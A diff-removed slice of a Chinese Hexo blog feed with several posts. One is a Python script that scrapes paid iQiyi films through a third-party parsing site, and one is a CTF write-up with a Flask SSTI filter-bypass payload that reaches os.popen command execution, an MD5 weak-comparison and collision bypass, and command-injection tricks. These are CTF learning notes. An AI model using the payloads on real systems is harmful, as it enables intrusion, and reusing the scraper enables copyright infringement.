href="https://www.aqniukt.com/course/11111/task/263097/show" target="_blank" rel="noopener">https://www.aqniukt.com/course/11111/task/263097/show</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;day1&quot;&gt;&lt;a href=&quot;#day1&quot; class=&quot;headerlink&quot; title=&quot;day1&quot;&gt;&lt;/a&gt;day1&lt;/h1&gt;&lt;h4 id=&quot;MVC架构&quot;&gt;&lt;a href=&quot;#MVC架构&quot; class=&quot;headerlink&quot; title=&quot;MVC架构&quot;&gt;&lt;/a&gt;MVC架构&lt;/h4&gt;&lt;p&gt;模型，视图，控制器；Model,View,Controller(用户交互);&lt;/p&gt;
-&lt;p&gt;&lt;img src=&quot;/images/3.1-1.png&quot; alt=&quot;3.1-1&quot;&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>利用python+视频url解析网站爬下vip电影</title>
-    <link href="http://yoursite.com/2020/02/28/2.28-python+%E8%A7%86%E9%A2%91url%E8%A7%A3%E6%9E%90%E7%BD%91%E7%AB%99%E7%88%AC%E4%B8%8Bvip%E7%94%B5%E5%BD%B1/"/>
-    <id>http://yoursite.com/2020/02/28/2.28-python+%E8%A7%86%E9%A2%91url%E8%A7%A3%E6%9E%90%E7%BD%91%E7%AB%99%E7%88%AC%E4%B8%8Bvip%E7%94%B5%E5%BD%B1/</id>
-    <published>2020-02-28T10:21:12.000Z</published>
-    <updated>2020-03-05T11:58:01.016Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="爬下vip电影"><a href="#爬下vip电影" class="headerlink" title="爬下vip电影"></a>爬下vip电影</h1><p>​    实现这个关键点有两个：</p><p>1.解析网站，</p><p>​    首先上爱奇艺打开电影，ctrl c下url，再用<a href="http://jx.618g.com/?url=&#39;url&#39;" target="_blank" rel="noopener">http://jx.618g.com/?url=&#39;url&#39;</a>;</p><p>F12会发现视频播放其实是由若干的 .ts请求文件接成的视频，所以爬下来就行</p><p>2.直接上代码，多线程+requests</p><a id="more"></a><p>下面是西虹市首富的实例；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://sohu.com-v-sohu.com/20181101/13971_6060c196/1000k/hls/652817bea0d%03d.ts'</span> %i</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    ret = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./video/&#123;&#125;'</span>.format(url[<span class="number">-10</span>:]),<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ret)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download2</span><span class="params">(i)</span>:</span></span><br><span class="line">    url = <span class="string">'https://sohu.com-v-sohu.com/20181101/13971_6060c196/1000k/hls/652817bea0d%4d.ts'</span> %i</span><br><span class="line">    print(url)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    ret = r.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'./video/&#123;&#125;'</span>.format(url[<span class="number">-10</span>:]),<span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(ret)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    po = Pool(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">        po.apply_async(download,args=(i,))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">1700</span>):</span><br><span class="line">        po.apply_async(download2,args=(i,))</span><br><span class="line"></span><br><span class="line">    po.close()</span><br><span class="line">    po.join()</span><br></pre></td></tr></table></figure><p>windows下视频合成命令 copy /b *.mp4 video.mp4</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;爬下vip电影&quot;&gt;&lt;a href=&quot;#爬下vip电影&quot; class=&quot;headerlink&quot; title=&quot;爬下vip电影&quot;&gt;&lt;/a&gt;爬下vip电影&lt;/h1&gt;&lt;p&gt;​    实现这个关键点有两个：&lt;/p&gt;
-&lt;p&gt;1.解析网站，&lt;/p&gt;
-&lt;p&gt;​    首先上爱奇艺打开电影，ctrl c下url，再用&lt;a href=&quot;http://jx.618g.com/?url=&amp;#39;url&amp;#39;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://jx.618g.com/?url=&amp;#39;url&amp;#39;&lt;/a&gt;;&lt;/p&gt;
-&lt;p&gt;F12会发现视频播放其实是由若干的 .ts请求文件接成的视频，所以爬下来就行&lt;/p&gt;
-&lt;p&gt;2.直接上代码，多线程+requests&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="python" scheme="http://yoursite.com/tags/python/"/>
-    
-      <category term="request" scheme="http://yoursite.com/tags/request/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>2.26安恒杯月赛wp</title>
-    <link href="http://yoursite.com/2020/02/27/2.26-%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwp/"/>
-    <id>http://yoursite.com/2020/02/27/2.26-%E5%AE%89%E6%81%92%E6%9D%AF%E6%9C%88%E8%B5%9Bwp/</id>
-    <published>2020-02-27T12:25:18.000Z</published>
-    <updated>2020-03-05T13:38:08.902Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="安恒杯月赛wp"><a href="#安恒杯月赛wp" class="headerlink" title="安恒杯月赛wp"></a>安恒杯月赛wp</h1><a id="more"></a><h4 id="web-1-EasyFlask"><a href="#web-1-EasyFlask" class="headerlink" title="web-1:EasyFlask"></a>web-1:EasyFlask</h4><p>​    这题做的时候没头绪，也不咋会做，看了大佬wp也，还不是很明白</p><p>不过后续查找资料就明白了，其实题目已经说了的，只不过以前没涉及到，</p><p>不然看到 flask的那一刻就该明白，考察点在ssti注入；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssti注入又称服务器端模板注入攻击(Server-Side Template Injection)，和sql注入一样，也是由于接受用户输入而造成的安全问题。</span><br><span class="line"></span><br><span class="line">它的实质就是服务器端接受了用户的输入，没有经过过滤或者说过滤不严谨，将用户输入作为web应用模板的一部分，但是在进行编译渲染的过程中，执行了用户输入的恶意代码，造成信息泄露，代码执行，getshell等问题。</span><br><span class="line"></span><br><span class="line">这个问题主要是出在web应用模板渲染的过程中，目前比较流行的渲染引擎模板主要有：smarty，twig，jinja2，freemarker，velocity</span><br><span class="line"></span><br><span class="line">而python中的一个微型框架flask主要就是使用的jinja2来作为渲染模板，</span><br><span class="line"></span><br><span class="line">原文链接：https:<span class="regexp">//</span>blog.csdn.net<span class="regexp">/qq_39850969/</span>article<span class="regexp">/details/</span><span class="number">86581393</span></span><br></pre></td></tr></table></figure><p>  这里写一下大佬的思路：</p><p>404页面存在flask ssti</p><p>且过滤 ‘.’和’_’</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于过滤点，可以用中括号括起来或者用attr()、getattr()绕过</span><br><span class="line">对于过滤下划线，可以用request[<span class="string">'arg'</span>]绕过，后来glotozz师傅告诉还可用dir(0)[<span class="string">0</span>][<span class="symbol">0</span>]绕过</span><br></pre></td></tr></table></figure><ul><li><code>_mro__</code>会500，要用<code>__base__</code></li><li>用<code>__subclasses__()[40](&#39;/etc/passwd&#39;).read()</code>会500</li></ul><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://183.129.189.60:10000/&#123;&#123;()|attr(request[<span class="string">'args'</span>][<span class="symbol">'x1'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x2'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x3'</span>])()|attr(request[<span class="string">'args'</span>][<span class="symbol">'x4'</span>])(233)|attr(request[<span class="string">'args'</span>][<span class="symbol">'x5'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x6'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x4'</span>])(request[<span class="string">'args'</span>][<span class="symbol">'x7'</span>])|attr(request[<span class="string">'args'</span>][<span class="symbol">'x4'</span>])(request[<span class="string">'args'</span>][<span class="symbol">'x8'</span>])(request[<span class="string">'args'</span>][<span class="symbol">'x9'</span>])&#125;&#125;?x1=<span class="strong">__class__</span>&amp;x2=<span class="strong">__base__</span>&amp;x3=<span class="strong">__subclasses__</span>&amp;x4=<span class="strong">__getitem__</span>&amp;x5=<span class="strong">__init__</span>&amp;x6=<span class="strong">__globals__</span>&amp;x7=<span class="strong">__builtins__</span>&amp;x8=eval&amp;x9=<span class="strong">__import__</span>("os").popen('想要执行的命令').read()</span><br></pre></td></tr></table></figure><p><code>ls /</code>之后发现存在<code>start.sh</code>，然后<code>cat start.sh</code>就行了</p><h4 id="web2-hash"><a href="#web2-hash" class="headerlink" title="web2-hash:"></a>web2-hash:</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'flag.php'</span>);</span></span><br><span class="line"><span class="php">$str1 = @$_GET[<span class="string">'str1'</span>];</span></span><br><span class="line"><span class="php">$str2 = @$_GET[<span class="string">'str2'</span>];</span></span><br><span class="line"><span class="php">$str3 = @$_GET[<span class="string">'str3'</span>];</span></span><br><span class="line"><span class="php">$str4 = @$_GET[<span class="string">'str4'</span>];</span></span><br><span class="line"><span class="php">$str5 = (string)@$_POST[<span class="string">'str5'</span>];</span></span><br><span class="line"><span class="php">$str6 = (string)@$_POST[<span class="string">'str6'</span>];</span></span><br><span class="line"><span class="php">$str7 = (string)@$_POST[<span class="string">'str7'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str1 == $str2 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str1 OR Sstr2 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( md5($str1) != md5($str2) )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 1 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str3 == $str4 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str3 OR str4 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> ( md5($str3) !== md5($str4))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 2 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'str5 OR str6 OR str7 no no no'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>(<span class="string">'step 3 fail'</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!($_POST[<span class="string">'a'</span>]) <span class="keyword">and</span> !($_POST[<span class="string">'b'</span>]))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"come on!"</span>;</span></span><br><span class="line"><span class="php">    <span class="keyword">die</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$a = $_POST[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b = $_POST[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php">$m = $_GET[<span class="string">'m'</span>];</span></span><br><span class="line"><span class="php">$n = $_GET[<span class="string">'n'</span>];</span></span><br></pre></td></tr></table></figure><p>这道题很直观，代码审计+md5绕过，碰撞等一系列和md5以及php相关的</p><p>val1和val2 php 弱比较绕过</p><p>val3 和 val4 数组绕过</p><p>val5\6\7,纯粹的MD5碰撞</p><p>这里介绍一个软件，fastcoll，利用之前提出的前缀法破解md5，可以生成值不同但md5值相同的字符串,很强大，比赛就卡在这里，很无奈，不太会用</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\fastcoll&gt;fastcoll_v1.<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>.exe -o <span class="keyword">jlzj0 </span><span class="keyword">jlzj1 </span>     <span class="comment">#-o参数代表随机生成两个相同MD5的文件</span></span><br><span class="line">D:\fastcoll&gt;fastcoll_v1.<span class="number">0</span>.<span class="number">0</span>.<span class="number">5</span>.exe -p <span class="keyword">jlzj1 </span>-o <span class="keyword">jlzj00 </span><span class="keyword">jlzj01 </span> <span class="comment">#-p参数代表根据jlzj1文件随机生成两个相同MD5的文件，注意：生成的MD5与jlzj1不同</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> <span class="keyword">jlzj00 </span>&gt; a                <span class="comment">#-c 128代表将jlzj00的最后128位写入文件a，这128位正是jlzj1与jlzj00的MD5不同的原因</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> <span class="keyword">jlzj01 </span>&gt; <span class="keyword">b </span>               <span class="comment">#同理</span></span><br><span class="line">D:\fastcoll&gt;type <span class="keyword">jlzj0 </span>a &gt; <span class="keyword">jlzj10 </span>                   <span class="comment">#这里表示将jlzj0和a文件的内容合并写入jlzj10</span></span><br><span class="line">D:\fastcoll&gt;type <span class="keyword">jlzj0 </span><span class="keyword">b </span>&gt; <span class="keyword">jlzj11 </span>                   <span class="comment">#同理写入jlzj11</span></span><br></pre></td></tr></table></figure><p>生成三个urlencode后赋给5,6,7</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(ctype_alnum(<span class="variable">$a</span>)) || (strlen(<span class="variable">$a</span>) &gt; 5) || !(ctype_alnum(<span class="variable">$b</span>)) || (strlen(<span class="variable">$b</span>) &gt; 6)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"a OR b fail!"</span>;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((strlen(<span class="variable">$m</span>) &gt; 1) || (strlen(<span class="variable">$n</span>) &gt; 1)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"m OR n fail"</span>;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$val8</span> = md5(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$val9</span> = strtr(md5(<span class="variable">$b</span>), <span class="variable">$m</span>, <span class="variable">$n</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> PHP_EOL;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;val8 : <span class="variable">$val8</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> PHP_EOL;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;p&gt;val9 : <span class="variable">$val9</span>&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> PHP_EOL;</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$val8</span> == <span class="variable">$val9</span>) &amp;&amp; !(<span class="variable">$a</span> === <span class="variable">$b</span>) &amp;&amp; (strlen(<span class="variable">$b</span>) === 5)) &#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"nice,good job,give you flag:"</span>;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="string">'./flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>val8 和 val9 还是弱比较，然后val9 又可以通过m,n替换钱两位，而且要求全数字ctype_alnum($a、$b)</p><p>这里爆破$a，和$b就行</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">import</span> <span class="string">hashlib</span></span><br><span class="line"><span class="attr">def</span> <span class="string">findA():</span></span><br><span class="line"><span class="attr">alphabet</span> = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span></span><br><span class="line"><span class="attr">for</span> <span class="string">a in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">b in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">c in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">d in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">e in alphabet:</span></span><br><span class="line"><span class="attr">payload</span> = <span class="string">(a+b+c+d+e).encode()</span></span><br><span class="line"><span class="attr">md5</span> = <span class="string">hashlib.md5(payload)</span></span><br><span class="line"><span class="attr">value</span> = <span class="string">md5.hexdigest()</span></span><br><span class="line"><span class="attr">pre</span> = <span class="string">value[0:2]</span></span><br><span class="line"><span class="attr">last</span> = <span class="string">value[2:32]</span></span><br><span class="line"><span class="attr">if</span> <span class="string">pre == '0e' and last.isdigit():</span></span><br><span class="line"><span class="meta">print('successful</span> <span class="string">A found!! &#123;&#125; \'s md5=&#123;&#125;'.format(payload, value))</span></span><br><span class="line"><span class="attr">return</span></span><br><span class="line"><span class="attr">def</span> <span class="string">findB():</span></span><br><span class="line"><span class="attr">alphabet</span> = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'</span></span><br><span class="line"><span class="attr">for</span> <span class="string">a in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">b in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">c in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">d in alphabet:</span></span><br><span class="line"><span class="attr">for</span> <span class="string">e in alphabet:</span></span><br><span class="line"><span class="attr">payload</span> = <span class="string">(a+b+c+d+e).encode()</span></span><br><span class="line"><span class="attr">md5</span> = <span class="string">hashlib.md5(payload)</span></span><br><span class="line"><span class="attr">value</span> = <span class="string">md5.hexdigest()</span></span><br><span class="line"><span class="attr">pre</span> = <span class="string">value[1:2]</span></span><br><span class="line"><span class="attr">last</span> = <span class="string">value[2:32]</span></span><br><span class="line"><span class="attr">if</span>  <span class="string">pre == 'e' and last.isdigit():</span></span><br><span class="line"><span class="meta">print('successful</span> <span class="string">B found! &#123;&#125; \'s md5=&#123;&#125;'.format(payload, value))</span></span><br><span class="line"><span class="attr">return</span></span><br><span class="line"></span><br><span class="line"><span class="attr">if</span> <span class="string">__name__ == '__main__':</span></span><br><span class="line"><span class="attr">findA()</span></span><br><span class="line"><span class="attr">findB()</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/30J2PH" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2020/02/27/30J2PH.png" alt="30J2PH.png"></a></p><p>最后payload:</p><p>m n 要能替换成0e</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span> m=<span class="number">7</span><span class="variable">&amp;n</span>=<span class="number">0</span></span><br><span class="line"><span class="symbol">POST:</span> a=byGcY<span class="variable">&amp;b</span>=aegsO</span><br></pre></td></tr></table></figure><h4 id="web-3-commix"><a href="#web-3-commix" class="headerlink" title="web-3 commix"></a>web-3 commix</h4><p>  本来网页直接打开就是命令执行，不过后面页面被搞没了；</p><p>主要过滤了cat和flag;</p><p>用内联执行+读取+拼接字</p><p>有以下这些</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">more `ls` </span><br><span class="line">tail `ls`</span><br><span class="line">less `ls`</span><br><span class="line">head `ls`</span><br><span class="line">tac `ls` </span><br><span class="line">rev `ls` | rev</span><br></pre></td></tr></table></figure><p>发现flag文件，拼接命令之后</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="bash">=a=t;ca<span class="variable">$a</span> <span class="string">'ls'</span></span></span><br></pre></td></tr></table></figure><p>参考网址：</p><p><a href="https://www.gem-love.com/ctf/1799.html" target="_blank" rel="noopener">https://www.gem-love.com/ctf/1799.html</a></p><p><a href="https://xz.aliyun.com/t/4741#toc-7" target="_blank" rel="noopener">https://xz.aliyun.com/t/4741#toc-7</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;安恒杯月赛wp&quot;&gt;&lt;a href=&quot;#安恒杯月赛wp&quot; class=&quot;headerlink&quot; title=&quot;安恒杯月赛wp&quot;&gt;&lt;/a&gt;安恒杯月赛wp&lt;/h1&gt;
-    
-    </summary>
-    
-    
-      <category term="ctf" scheme="http://yoursite.com/categories/ctf/"/>
-    
-    
-      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
-    
-      <category term="ssti注入" scheme="http://yoursite.com/tags/ssti%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="hash" scheme="http://yoursite.com/tags/hash/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>http协议-url 构成</title>
-    <link href="http://yoursite.com/2020/02/23/2.23-http%E5%8D%8F%E8%AE%AE-url-%E6%9E%84%E6%88%90/"/>
-    <id>http://yoursite.com/2020/02/23/2.23-http%E5%8D%8F%E8%AE%AE-url-%E6%9E%84%E6%88%90/</id>
-    <published>2020-02-23T11:48:34.000Z</published>
-    <updated>2020-03-05T08:03:15.219Z</updated>
-    
-    <content type="html"><![CDATA[<p>1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符</p><p><strong>2.</strong>域名部分：该URL的域名部分为“<a href="http://www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用" target="_blank" rel="noopener">www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用</a></p><p><strong>3.</strong>端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p> <a id="more"></a><p><strong>4.</strong>虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p><p><strong>5.</strong>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p><p><strong>6.</strong>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p><p><strong>7.</strong>参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;1.协议部分：该URL的协议部分为“http：”，这代表网页使用的是HTTP协议。在Internet中可以使用多种协议，如HTTP，FTP等等本例中使用的是HTTP协议。在”HTTP”后面的“//”为分隔符&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;2.&lt;/strong&gt;域名部分：该URL的域名部分为“&lt;a href=&quot;http://www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;www.aspxfans.com”。一个URL中，也可以使用IP地址作为域名使用&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;3.&lt;/strong&gt;端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="note" scheme="http://yoursite.com/categories/note/"/>
-    
-    
-      <category term="http" scheme="http://yoursite.com/tags/http/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>note-xxe漏洞浅析</title>
-    <link href="http://yoursite.com/2020/02/23/2.23-note-xxe%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"/>
-    <id>http://yoursite.com/2020/02/23/2.23-note-xxe%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/</id>
-    <published>2020-02-23T09:18:22.000Z</published>
-    <updated>2020-03-05T08:10:04.272Z</updated>
-    
